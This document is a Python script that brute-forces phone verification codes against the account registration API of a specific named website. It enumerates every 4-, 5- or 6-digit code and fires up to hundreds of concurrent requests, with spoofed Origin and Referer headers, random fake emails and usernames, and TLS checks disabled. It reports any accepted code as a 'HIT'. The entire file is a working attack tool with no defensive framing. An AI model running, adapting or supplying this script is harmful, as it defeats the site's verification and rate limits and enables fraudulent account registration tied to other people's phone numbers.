import asyncio, httpx, json, random, time, sys
BASE="https://ofa1777.ofa377.net/api"
H={"Content-Type":"application/json","Origin":"https://ofa1777.ofa377.net","Referer":"https://ofa1777.ofa377.net/"}
def space(kind):
    if kind=="4":
        c=[str(x).zfill(4) for x in range(0,10000)]
        c+=[str(x) for x in range(1000,10000)]
    elif kind=="6":
        c=[str(x).zfill(6) for x in range(0,1000000)]
        c+=[str(x) for x in range(100000,1000000)]
    elif kind=="5":
        c=[str(x).zfill(5) for x in range(0,100000)]
        c+=[str(x) for x in range(10000,100000)]
    else:
        c=[str(x).zfill(int(kind)) for x in range(0,10**int(kind))]
    return list(dict.fromkeys(c))
async def main():
    phone=sys.argv[1]; kind=sys.argv[2]; offset=int(sys.argv[3]); n=int(sys.argv[4]); conc=int(sys.argv[5]) if len(sys.argv)>5 else 500
    codes=space(kind)[offset:offset+n]
    async with httpx.AsyncClient(verify=False,timeout=20,limits=httpx.Limits(max_connections=conc+50,max_keepalive_connections=conc)) as c:
        t0=time.time(); done=0
        sem=asyncio.Semaphore(conc)
        async def one(code):
            nonlocal done
            async with sem:
                d={"bank_account":"1","bank_code":"CMB","bank_currency":"TWD","bank_name":"T","email":"e%d@x.com"%random.randint(1,10**9),"line":"l","name":"T","password":"Passw0rd!123","phone_number":phone,"refer_code":"","username":"u%d"%random.randint(10**6,10**7),"verify_code":code}
                rr=await c.post(BASE+"/v2/register/",data=json.dumps(d),headers=H)
                try: b=rr.json()
                except: return
                done+=1
                if b.get("code") in (200,201) or (isinstance(b,dict) and b.get("error_code") not in ("4405",None) or b.get("code")==200):
                    print("HIT",code,rr.status_code,json.dumps(b)[:700],flush=True)
        tasks=[asyncio.create_task(one(x)) for x in codes]
        for t in asyncio.as_completed(tasks):
            await t
        print("SLICE kind=%s off=%d n=%d done=%d elapsed=%.1fs"%(kind,offset,len(codes),done,time.time()-t0),flush=True)
asyncio.run(main())
